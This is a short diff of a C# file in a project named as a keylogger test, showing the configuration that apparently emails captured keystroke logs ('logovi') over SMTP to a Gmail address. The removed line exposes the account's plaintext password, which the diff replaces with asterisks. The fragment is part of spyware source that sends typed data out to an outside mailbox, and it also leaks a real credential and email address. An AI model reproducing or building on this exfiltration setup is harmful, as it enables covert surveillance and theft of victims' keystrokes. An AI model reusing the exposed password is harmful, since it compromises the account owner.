@@ -22,7 +22,7 @@ namespace Key_Logger_proba
         static int portNumber = 587;
         static bool enableSSL = true;
         static string emailFromAdress = "miremaremarko@gmail.com";
-        static string password = "marko2020.";
+        static string password = "**********";
         static string emailToAdress = "miremaremarko@gmail.com";
         static string subject = "logovi";
         static string body = "logovi";
